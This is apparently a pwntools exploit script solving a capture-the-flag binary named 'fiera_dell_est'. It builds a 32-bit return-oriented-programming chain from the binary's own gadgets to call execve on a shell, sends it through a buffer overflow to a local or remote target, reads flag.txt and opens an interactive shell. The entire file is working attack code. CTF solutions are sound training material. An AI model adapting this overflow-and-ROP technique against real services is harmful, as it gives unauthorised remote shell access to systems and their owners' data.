from pwn import *
import sys

# context.terminal = ['konsole', '-e']  # needed if you want to debug with gdb (set with your own terminal)
# context.log_level = 'debug'
# context.arch = 'X86'

#########################################################
BINARY="./fiera_dell_est"   # path to the binary file
ENV={}      # list of enviroment variables, useful if you need to use a given library
GDB=""      # commands to execute if you debug using gdb
HOST="redacted.it"     # host for remote connection
PORT=5015   # port for remote connection 
#########################################################

if len(sys.argv) < 2:
    print("args: bin|net|ida|gdb\n")
    sys.exit(1)

if sys.argv[1] == "bin":
    p = process(BINARY, env=ENV)
elif sys.argv[1] == "net":
    p = remote(HOST, PORT)
elif sys.argv[1] == "ida":
    # remote ida debugger can bu found at ~/.wine/drive_c/Program\ Files/IDA\ 7.5/dbgsrv/linux_server
    p = process("./linux_server", env=ENV)
    p.recvuntil(b"0.1...")
elif sys.argv[1] == "gdb":
    p = process(BINARY, env=ENV)
    gdb.attach(p, GDB)
else:
    print("args: bin|net|ida|gdb")
    sys.exit(1)

binary = ELF(BINARY)    # creates an ELF object useful to access easily symbols in the bin

p.recvline()

code = b''
code += p32(binary.symbols['topo']) #pop eax 
code += p32(0x0b)  #push 0xb
code += p32(binary.symbols['gatto'])  #pop ebx
code += p32(binary.symbols['shell']) #push shell
code += p32(binary.symbols['cane']) #pop edx
code += p32(0x0) #push0
code += p32(binary.symbols['bastone']) #pop ecx
code += p32(0)  #push 0
code += p32(binary.symbols['angelo_della_morte'])

payload = b'due\0' + b'AAAA' + b'BBBB' + b'CCCC' + code
p.send(payload)
p.sendline('cat flag.txt')

p.interactive()
